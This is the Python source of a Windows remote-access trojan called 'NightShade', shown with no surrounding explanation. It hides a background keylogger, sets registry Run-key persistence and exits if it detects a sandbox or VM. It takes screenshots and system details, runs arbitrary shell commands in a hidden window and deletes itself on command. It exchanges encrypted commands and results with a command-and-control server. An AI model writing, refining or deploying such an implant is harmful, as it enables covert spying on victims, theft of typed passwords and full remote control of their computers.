import requests, subprocess, time, platform, getpass, random, os, io, winreg, sys
from cryptography.fernet import Fernet
import mss 
import psutil 
from pynput import keyboard 
import threading

MASTER_KEY = b'ZOVYlkVemlNv6eHwPGbOtM1p_LZwMEmHIg-e0bGh_xo=' 
cipher = Fernet(MASTER_KEY)
URL = "http://127.0.0.1:5000"

keystrokes = ""
def on_press(key):
    global keystrokes
    try:
        keystrokes += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space: keystrokes += " "
        elif key == keyboard.Key.enter: keystrokes += "\n"
        else: keystrokes += f" [{str(key).replace('Key.', '')}] "

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=start_keylogger, daemon=True).start()

def set_persistence():
    try:
        app_path = os.path.realpath(sys.argv[0])
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NightShade", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
    except: pass

def get_sysinfo():
    try:
        info = {"node": platform.node(), "os": f"{platform.system()} {platform.release()}", "user": getpass.getuser(), "arch": platform.machine()}
        return str(info).encode()
    except Exception as e:
        return f"Error: {str(e)}".encode()

def take_screenshot():
    try:
        with mss.mss() as sct:
            filename = sct.shot(mon=1, output='temp.png')
            with open(filename, "rb") as f:
                img_data = f.read()
            os.remove(filename) 
            return img_data
    except Exception as e:
        return f"Error: {str(e)}".encode()

def self_destruct():
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "NightShade")
            winreg.CloseKey(key)
        except: pass
        script = "clean.bat"
        exe = os.path.basename(sys.argv[0])
        with open(script, "w") as f:
            f.write(f'@echo off\ntimeout /t 3 /nobreak > NUL\ndel /f /q "{exe}"\ndel /f /q "{script}"\n')
        subprocess.Popen(script, shell=True)
        sys.exit(0)
    except: sys.exit(1)

def is_sandbox():
    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024: return True
    if os.cpu_count() < 2: return True
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in ['VBoxService.exe', 'vmtoolsd.exe']: return True
    return False

if is_sandbox(): sys.exit(0)
set_persistence() 

while True:
    try:
        r = requests.get(f"{URL}/get_command")
        if r.status_code == 200:
            cmd = cipher.decrypt(r.content).decode()
            if cmd == "sysinfo": res = get_sysinfo()
            elif cmd == "screengrab": res = take_screenshot()
            elif cmd == "keylog_dump": 
                res = keystrokes.encode()
                keystrokes = "" 
            elif cmd == "self_destruct": self_destruct()
            else:
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, startupinfo=si)
            
            requests.post(f"{URL}/post_result", data={'result': cipher.encrypt(res)})
    except: pass
    time.sleep(random.randint(5, 15))